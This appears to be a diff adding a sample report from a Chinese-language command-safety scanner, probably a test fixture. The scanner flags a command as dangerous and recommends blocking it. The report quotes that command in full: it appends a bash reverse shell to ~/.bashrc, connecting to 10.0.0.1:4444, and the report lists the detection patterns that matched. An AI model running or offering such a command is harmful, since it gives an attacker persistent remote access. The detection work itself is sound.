@@ -1,0 +1,15 @@
+🚨 判定: DANGEROUS (风险分: 100/100, 置信度: HIGH)
+命令: echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc
+
+发现 5 个问题 (4 严重, 1 警告):
+  [CRITICAL] 静态分析: 命令匹配恶意模式: reverse shell via /dev/tcp [T1059.004]
+  [CRITICAL] 静态分析: 命令匹配恶意模式: interactive bash reverse shell [T1059.004]
+  [CRITICAL] 内容分析: Shell 配置含恶意内容: reverse shell via /dev/tcp [T1059.004]
+  [CRITICAL] 内容分析: Shell 配置含恶意内容: interactive bash reverse shell [T1059.004]
+  [WARN] Shell环境: Shell 配置文件被修改 [T1546.004]
+
+涉及 ATT&CK 战术: Execution, Persistence
+
+建议:
+  • BLOCK: 强烈建议阻止此命令执行
+  • 检查网络连接: ss -tunap | grep ESTABLISHED
